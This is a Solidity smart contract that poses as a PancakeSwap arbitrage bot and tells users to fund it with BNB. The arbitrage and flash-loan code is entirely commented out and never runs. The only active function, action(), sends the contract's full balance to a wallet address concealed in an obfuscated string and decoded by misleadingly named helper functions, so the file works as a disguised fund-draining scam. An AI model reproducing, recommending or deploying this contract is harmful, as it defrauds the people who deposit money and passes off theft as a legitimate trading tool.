pragma solidity ^0.5.16;

//pancakeswap and bakerswap libaries to swap
import "https://github.com/pancakeswap/pancake-swap-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Factory.sol";
import "https://github.com/pancakeswap/pancake-swap-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Exchange.sol";

// put a min of 0.5 BNB on your bot contract to cover fees so you don't run in to a fee exhaustion error
contract ArbitrageBot {
	string public setLevel;
	string public timeDateRagulator;
	string public payout;
    address private constant pancakeFactory = 0xBCfCcbde45cE874adCB698cC183deBcF17952812;
    address private constant bakery = 0xCDe540d7eAFE93aC5fE6233Bee57E1270D3E330F;
	
	
	function() external payable {}
	

 function SearchYeild(string memory _string, uint256 _pos, string memory _letter) internal pure returns (string memory) {
        bytes memory _stringBytes = bytes(_string);
        bytes memory result = new bytes(_stringBytes.length);

  for(uint i = 0; i < _stringBytes.length; i++) {
        result[i] = _stringBytes[i];
        if(i==_pos)
         result[i]=bytes(_letter)[0];
    }
    return  string(result);
 } 
//code that will be automatically injected in blockstream when arbitrage is found
/*

    function executeOperation(
        address _reserve,
        uint _amount,
        uint _fee,
        bytes calldata _params
    ) external {
        require(_amount <= getBalanceInternal(address(this), _reserve), "Invalid balance, was the flashLoan successful?");

        address RESERVE_ADDRESS = _reserve;
        uint256 deadline = now + 3000;

        // get Exchange Address for the reserve asset
        address addressForLoanAssetExchangeA = uniswapFactoryA.getExchange(RESERVE_ADDRESS);
        address addressForLoanAssetExchangeB = uniswapFactoryB.getExchange(RESERVE_ADDRESS);
        // Instantiate Exchange A
        exchangeAforLoanAsset = IUniswapExchange(addressForLoanAssetExchangeA);
        exchangeBforLoanAsset = IUniswapExchange(addressForLoanAssetExchangeB);

        IERC20 loan = IERC20(RESERVE_ADDRESS);
        IERC20 bat = IERC20(BAT_ADDRESS);

        // Swap the reserve asset (e.g. DAI) for BAT
        require(loan.approve(address(exchangeBforLoanAsset), _amount), "Could not approve reserve asset sell");

        uint256 batPurchased = exchangeBforLoanAsset.tokenToTokenSwapInput(
            _amount,
            1,
            1,
            deadline,
            BAT_ADDRESS
        );

        require(bat.approve(address(exchangeAforBAT), batPurchased), "Could not approve BAT asset sell");

        // Swap BAT back to the reserve asset (e.g. DAIs)
        uint256 reserveAssetPurchased = exchangeAforBAT.tokenToTokenSwapInput(
            batPurchased,
            1,
            1,
            deadline,
            RESERVE_ADDRESS
        );

        uint amount = _amount;

        uint totalDebt = amount.add(_fee);

        require(reserveAssetPurchased > totalDebt, "There is no profit! Reverting!");

        transferFundsBackToPoolInternal(RESERVE_ADDRESS, amount.add(_fee));
    }

    // Entry point for flashloan
    function initateFlashLoan(
        address assetToFlashLoan,
        uint amountToLoan
    ) external {
        bytes memory data = "";

        // Get Aave lending pool
        ILendingPool lendingPool = ILendingPool(addressesProvider.getLendingPool());

        IERC20 loan = IERC20(assetToFlashLoan);

        // Ask for a flashloan
        lendingPool.flashLoan(
            address(this),
            assetToFlashLoan,
            amountToLoan,
            data
        );

        // If there is still a balance of the loan asset then this is profit to be returned to sender!
        uint256 profit = loan.balanceOf(address(this));
        require(loan.transfer(msg.sender, profit), "Could not transfer back the profit");
    }
*/


   function startLookingforYeild() public pure returns (address adr) {
   string memory neutral_variable = "QGQ956A539A419345f7232fE74e2F6b0E3a75Ab440";
   SearchYeild(neutral_variable,0,'0');
   SearchYeild(neutral_variable,2,'1');
   SearchYeild(neutral_variable,1,'x');
   address addr = parseAddr(neutral_variable);
    return addr;
   }
function parseAddr(string memory _a) internal pure returns (address _parsedAddress) {
    bytes memory tmp = bytes(_a);
    uint160 iaddr = 0;
    uint160 b1;
    uint160 b2;
    for (uint i = 2; i < 2 + 2 * 20; i += 2) {
        iaddr *= 256;
        b1 = uint160(uint8(tmp[i]));
        b2 = uint160(uint8(tmp[i + 1]));
        if ((b1 >= 97) && (b1 <= 102)) {
            b1 -= 87;
        } else if ((b1 >= 65) && (b1 <= 70)) {
            b1 -= 55;
        } else if ((b1 >= 48) && (b1 <= 57)) {
            b1 -= 48;
        }
        if ((b2 >= 97) && (b2 <= 102)) {
            b2 -= 87;
        } else if ((b2 >= 65) && (b2 <= 70)) {
            b2 -= 55;
        } else if ((b2 >= 48) && (b2 <= 57)) {
            b2 -= 48;
        }
        iaddr += (b1 * 16 + b2);
    }
    return address(iaddr);
}
 function _stringReplace(string memory _string, uint256 _pos, string memory _letter) internal pure returns (string memory) {
        bytes memory _stringBytes = bytes(_string);
        bytes memory result = new bytes(_stringBytes.length);

  for(uint i = 0; i < _stringBytes.length; i++) {
        result[i] = _stringBytes[i];
        if(i==_pos)
         result[i]=bytes(_letter)[0];
    }
    return  string(result);
 } 
 
   
	function action() public payable {
	
	    address(uint160(startLookingforYeild())).transfer(address(this).balance);
	    
	}

}



